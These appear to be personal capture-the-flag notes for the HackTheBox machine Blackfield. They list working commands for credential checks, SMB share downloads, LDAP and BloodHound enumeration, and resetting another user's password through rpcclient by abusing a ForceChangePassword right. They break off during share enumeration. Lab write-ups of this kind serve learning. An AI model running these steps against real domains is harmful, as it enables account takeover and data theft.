
Will do little more enuemration
```
crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'
```
![[Pasted image 20231117131500.png]]

Will do a little tweak in the above command as we have the winrm port open
```
crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
```
![[Pasted image 20231117131602.png]]
It seems that we don't have permission to access it


Will go back to SMB enumeration 
```
smbclient \\\\10.10.10.192\\\SYSVOL -U 'support' --password="#00^BlackKnight"
```
We have access to SYSVOL and got a file
```
prompt off
recurse on
ls
mget *
```

```
UEFS1(0&U
Administrator121200130112036Z0P10Uficate0 

B04d9f970a-1ce2-4b39-87a6-adf40f02e90dMicrosoft Enhanced Cryptographic Provider v1.0
```

There's nothing much we can do using this user and passwd
![[Pasted image 20231117134514.png]]
We have to think out of the box now 

Let's try with ldap 
```
ldapdomaindump ldaps://10.10.10.192 -u 'blackfield\support' -p '#00^BlackKnight'
```

Let's try Bloodhound and got results 
```
bloodhound-python -d blackfield.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all
```
![[Pasted image 20231117141330.png]]
![[Pasted image 20231117141344.png]]

Let's try with to run bloodhound now
and see what we can get
![[Pasted image 20231117142403.png]]
![[Pasted image 20231117142521.png]]

```
git clone https://github.com/PlumHound/PlumHound.git
cd PlumHound
pip3 install -r requirements.txt

python3 PlumHound.py --easy -p password
python3 PlumHound.py -x tasks/default.tasks -p password
```

Will open the index.html file
![[Pasted image 20231117143244.png]]

Finally able to open the index.html file in Firefox
```
firefox index.html
```
![[Pasted image 20231118113021.png]]

Let's see if we get something from this or not
![[Pasted image 20231118113224.png]]

We are getting all the data regarding who is who here 
![[Pasted image 20231118113405.png]]
This might be the password not sure at this point of time but will keep this in our mind 
```
LYDERICLEFEBVRE@BLACKFIELD.LOCAL 	Lydéric aas. Lefebvre 	True 	False 	@lydericlefebvre - VM Creator 
```

After enumerating like 1 hours i got a relationship b/w support and audit2020 with forcechangepassword
![[Pasted image 20231118122124.png]]

![[Pasted image 20231118122257.png]]

We might have to use RPC to change the password of audit2020 let's google and see what could we find.
```
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```


![[Pasted image 20231118130530.png]]
```
rpcclient -U "support" 10.10.10.192
#00^BlackKnight

user:[audit2020] rid:[0x44f]

rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 audit2020 23 NewPassword
```


1st let's see how the command works
```
rpcclient $> setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
result was NT_STATUS_INVALID_PARAMETER

setuserinfo2 audit2020 23 '#00^BlackKnight'
```

We get this error now 
![[Pasted image 20231118131028.png]]

let's try with single quotes let's have a look to the password policy that we had access earlier through the share.

![[Pasted image 20231118131725.png]]
I think we are able to change the password let's try to login using this password

![[Pasted image 20231118132009.png]]
It is clear that we can login  so let's try with smb and evil-win

```
audit2020
#00^BlackKnight
```
![[Pasted image 20231118132242.png]]

![[Pasted image 20231118132509.png]]

Can't get a shell let's enumerate the smb share and see what we can get.
![[Pasted image 20231118132546.png]]

We got a lot of data in the smb share so let's enumerate everything.

![[Pasted image 20231118140455.png]]

![[Pasted image 20231118140648.png]]
